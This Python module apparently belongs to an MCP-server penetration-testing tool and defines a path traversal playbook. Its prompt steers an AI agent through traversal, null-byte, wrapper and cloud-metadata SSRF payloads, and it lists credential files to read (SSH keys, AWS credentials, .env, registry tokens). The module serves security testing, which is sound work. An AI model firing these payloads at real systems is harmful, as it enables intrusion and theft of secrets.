"""Path traversal attack playbook."""

from __future__ import annotations

from mcpfang.agents.base import BasePlaybook
from mcpfang.agents.context import AttackContext
from mcpfang.playbooks.registry import register_playbook
from mcpfang.reporting.models import Finding, Severity, FindingCategory


@register_playbook
class PathTraversalPlaybook(BasePlaybook):
    name = "path_traversal"
    category = "path_traversal"
    severity_default = "high"
    cwe_ids = ["CWE-22", "CWE-23"]
    description = "Tests for path traversal and directory escape via tool parameters"

    def get_system_prompt(self, context: AttackContext) -> str:
        return f"""You are an expert security researcher performing a penetration test on an MCP server.
Your goal is to find PATH TRAVERSAL vulnerabilities in the server's tools.

{context.domain_context}

Available tools on the target server:
{context.tools_summary}

## Attack Strategy

1. **Identify file/path parameters**: Look for tools that accept file paths, URLs,
   resource identifiers, or any string that might be used to access the filesystem.
   Parameters named "path", "file", "filename", "dir", "directory", "url", "uri",
   "resource", "template", "include", "page", "doc" are high-priority targets.

2. **Test basic traversal**:
   - `../../../etc/passwd` (Unix)
   - `..\\..\\..\\windows\\system.ini` (Windows)
   - `....//....//etc/passwd` (filter bypass)
   - `..%2f..%2f..%2fetc/passwd` (URL encoding)
   - `..%252f..%252f..%252fetc/passwd` (double encoding)

3. **Test null byte injection**:
   - `../../../etc/passwd%00.png` (null byte truncation)
   - `../../../etc/passwd%00` (null byte termination)

4. **Test absolute path access**:
   - `/etc/passwd` (direct absolute path)
   - `file:///etc/passwd` (file URI scheme)
   - `C:\\Windows\\system.ini` (Windows absolute)

5. **Test wrapper/protocol abuse**:
   - `php://filter/convert.base64-encode/resource=index`
   - `data://text/plain;base64,SSBhbSBhIHRlc3Q=`

6. **Test SSRF via URL parameters** (30% of MCP servers vulnerable per Equixly research):
   - `http://localhost:8080/admin` — internal service access
   - `http://169.254.169.254/latest/meta-data/` — AWS metadata endpoint
   - `http://169.254.169.254/metadata/instance?api-version=2021-02-01` — Azure metadata
   - `http://metadata.google.internal/computeMetadata/v1/` — GCP metadata
   - `http://[::1]:80/` — IPv6 localhost bypass

7. **Target high-value files** (MCP01 token/secret exposure):
   - `../.env` or `/app/.env` — environment variables with API keys
   - `~/.ssh/id_rsa` or `../.ssh/id_rsa` — SSH private keys
   - `~/.cursor/mcp.json` — MCP configuration with credentials
   - `~/.aws/credentials` — AWS access keys
   - `~/.config/gcloud/credentials.db` — GCP credentials
   - `/proc/self/environ` — process environment variables
   - `~/.npmrc` or `~/.pypirc` — package registry tokens

8. **Detect successful traversal**: Look for file contents in responses —
   "root:x:0:0", "[extensions]", password hashes, config data, stack traces
   revealing filesystem paths, "BEGIN RSA PRIVATE KEY", "AWS_ACCESS_KEY",
   "ANTHROPIC_API_KEY", connection strings.

Be methodical. Test one payload per tool call. Record exact inputs and outputs."""

    def get_initial_message(self, context: AttackContext) -> str:
        tool_names = [t.name for t in context.discovery.tools]
        return (
            f"Begin your path traversal assessment. "
            f"The target has these tools: {', '.join(tool_names)}. "
            f"Identify tools with file/path parameters and start testing."
        )

    def parse_findings(self, agent_output: str) -> list[Finding]:
        findings = []
        traversal_indicators = [
            "root:x:0", "[extensions]", "passwd", "shadow",
            "path traversal", "directory traversal", "file disclosure",
            "sensitive file", "local file inclusion",
        ]
        output_lower = agent_output.lower()
        if any(indicator in output_lower for indicator in traversal_indicators):
            findings.append(Finding(
                id="PTR-001",
                title="Potential path traversal detected",
                description="The agent detected indicators of path traversal vulnerability.",
                severity=Severity.HIGH,
                category=FindingCategory.PATH_TRAVERSAL,
                tool_name="unknown",
                playbook=self.name,
                cwe_ids=self.cwe_ids,
                raw_output=agent_output,
            ))
        return findings
